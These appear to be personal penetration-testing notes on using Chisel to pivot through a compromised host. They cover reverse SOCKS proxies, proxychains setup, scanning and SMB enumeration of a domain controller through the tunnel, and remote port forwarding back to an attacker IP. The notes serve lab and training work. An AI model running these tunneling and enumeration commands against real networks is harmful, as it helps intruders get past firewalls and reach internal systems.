# Chisel

## Overview

During network pivoting, Chisel is often used to create fast TCP/UDP tunnels over HTTP, especially in environments where direct connectivity is restricted. It is useful for exposing internal services externally or forwarding ports through a compromised host. Because it operates over a single port and can use HTTP, it is often effective in restricted or firewall-heavy environments.

---
Reverse SOCKS Proxy
---
- Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
- SSH can be used to create both port forwards, and proxies
- plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
- Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
- Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
- sshuttle is a nicer way to create a proxy when we have SSH access on a target


With Chisel
Setup

My Kali machine: 192.168.222.131
Compromised Machine: 192.178.222.130
DC: 10.0.0.100

Chisel Server on our kali machine
./chisel server -p 8000 --reverse

Chisel client on compromised machine
Chisel client 192.168.222.131:8000 R:socks
- the R is remote forwarding on the socks proxy which allows it to connect to the DC

Remember to modify the /etc/proxychains4.conf file
- add the following: socks5 127.0.0.1 1080


Using proxychains
Prepend proxychains to any command you want to run e.g. proxychains nmap

NOTE: regular nmap does not work with proxychains. No stealth scan so we need to do a full tcp scan (-sT)
E.g. proxychains nmap -sT -p 88 -Pn -n 10.0.0.100

Scanning all ports with proxychains is very slow, so scan 10, 100 or so at a time (--top-ports)

Enumerating SMB with proxychains
E.g. proxychains crackmapexec smb 10.0.0.100 -u 'guest' -p '' (2 apostrophes with no space)

NOTE:
We can reach any host on the internal network with the same configuration
E.g. reaching 10.0.0.50, just run our nmap scan: proxychains nmap -sT -p 88 -Pn -n 10.0.0.50
- might not need to double pivot to next machine. You can just transfer netcat to the compromised machine and the DC, and catch the shell on the Compromised machine (our kali machine through the proxy?)

To visit a website, enable proxychains in foxy proxy and go to 127.0.0.1:[port]

Working example on machine Air (Proving Grounds)


Remote Port Forward
---
Connecting back from a compromised target to create the forward.

On attacking machine:
```
./chisel server -p LISTEN_PORT --reverse &
```

On compromised host
```
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```
The listen port is the port we started the chisel server on. The local port is the port we want open to connect our machine with the target to.

Assuming port 8080 is open on compromised machine and running a webserver [127.0.0.1], and our chisel server is listening on port 8081 [My IP is 192.168.45.118]
```
./chisel client 192.168.45.118:8081 R:8082:127.0.0.1:8080 &
```
We can access the target by navigating to 127.0.0.1:8082
